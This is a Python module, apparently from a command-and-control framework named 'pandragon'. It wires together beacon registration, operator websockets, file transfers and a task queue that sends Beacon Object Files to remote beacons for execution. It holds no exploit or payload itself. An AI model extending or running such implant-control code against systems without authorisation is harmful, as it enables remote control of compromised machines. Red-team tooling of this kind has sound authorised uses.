"""
Application Context

Single composition root that owns all application components.
Eliminates module-level singletons and app-dict wiring.
"""

import os
import asyncio
import logging

from beacon.registry import BeaconRegistry
from beacon.cache_state import BeaconCacheState
from beacon.bof_cache import BofCache
from operators.manager import OperatorManager
from transfers.manager import FileTransferManager
from security.audit_logger import AuditLogger
from tasks.queue import TaskQueue
from transports import HTTPTransport, BeaconTransportHandler


logger = logging.getLogger('pandragon.context')


class ApplicationContext:
    """Owns all application components."""

    def __init__(self, config: dict):
        self.config = config
        self.bof_directory = config.get('beacon', {}).get('bof_directory', 'bofs')

        self.operator_manager = OperatorManager(cred_file=config.get("operators_file", "operators.json"))
        self.file_transfer_manager = FileTransferManager()
        self.audit_logger = AuditLogger(config.get("audit"))

        self.beacon_registry = BeaconRegistry(known_beacons_path=config.get("beacons_file", "known_beacons.json"))

        self.beacon_cache_state = BeaconCacheState()
        self.bof_cache = BofCache()
        self.task_queue = TaskQueue()

        self.http_transport = HTTPTransport()
        self.beacon_handler = BeaconTransportHandler(self)
        self.http_transport.set_handler(self.beacon_handler)

        self.operator_sockets: set = set()
        self.beacon_app = None  # Set by run.py after creation for dynamic route registration

    def add_beacon_routes(self, paths: list[str]):
        """Dynamically register new HTTP beacon routes on the beacon app."""
        if self.beacon_app is None or not paths:
            return
        for path in paths:
            if path:
                self.beacon_app.router.add_route(
                    "GET", f"/{path}", self.http_transport.handle_request,
                )
                self.beacon_app.router.add_route(
                    "POST", f"/{path}", self.http_transport.handle_request,
                )
                logger.info(f"Dynamic route added: /{path}")

    async def broadcast(self, event: str, data: dict):
        dead = []
        payload = {'type': event, **data}
        for ws in self.operator_sockets:
            try:
                await ws.send_json(payload)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.operator_sockets.discard(ws)

    async def broadcast_except(self, event: str, data: dict, exclude_ws):
        dead = []
        payload = {'type': event, **data}
        for ws in self.operator_sockets:
            if ws is exclude_ws:
                continue
            try:
                await ws.send_json(payload)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.operator_sockets.discard(ws)

    async def _on_task(self, task_id: str, beacon_id: str, opcode: int, payload: bytes):
        """Task scheduler callback: queue a task to a beacon."""
        from protocol.constants import S2BOpcode
        from protocol.payload_builder import build_payload

        beacon_obj = self.beacon_registry.get(beacon_id)
        if not beacon_obj:
            logger.warning(f"Task scheduler: beacon {beacon_id} not found")
            return

        if opcode == S2BOpcode.BOF_EXEC:
            try:
                bof_name = payload.decode('utf-8').strip('\x00')
                bof_dir = self.config.get('beacon', {}).get('bof_directory', 'bofs')
                bof_path = os.path.join(bof_dir, os.path.basename(bof_name))

                if not os.path.exists(bof_path):
                    logger.error(f"BOF file not found: {bof_path}")
                    return

                loop = asyncio.get_event_loop()
                bof_data = await loop.run_in_executor(None, lambda: open(bof_path, 'rb').read())

                bof_id, _ = self.bof_cache.get_bof_id(bof_data)
                include_data = not self.beacon_cache_state.is_cached(beacon_id, bof_id)
                bof_metadata = {'bof_id': bof_id, 'bof_data': bof_data, 'include_data': include_data}
                final_payload = build_payload(S2BOpcode.BOF_EXEC, payload, bof_metadata)
                await beacon_obj.queue_task(S2BOpcode.BOF_EXEC, final_payload)
                await beacon_obj.add_long_running_bof(bof_id, bof_name)
                logger.info(f"Scheduled BOF_EXEC: {bof_name} -> {beacon_id} (bof_id={bof_id}, include_data={include_data})")
            except Exception as e:
                logger.error(f"Failed to build BOF_EXEC payload: {e}")
        else:
            await beacon_obj.queue_task(opcode, payload)

        if task_id:
            beacon_obj.current_task_id = task_id

    def _on_complete(self, task_id: str, state, result, error):
        """Task completion callback."""
        logger.info(f"Task {task_id} state={state.name} ({len(result or b'')} bytes)")
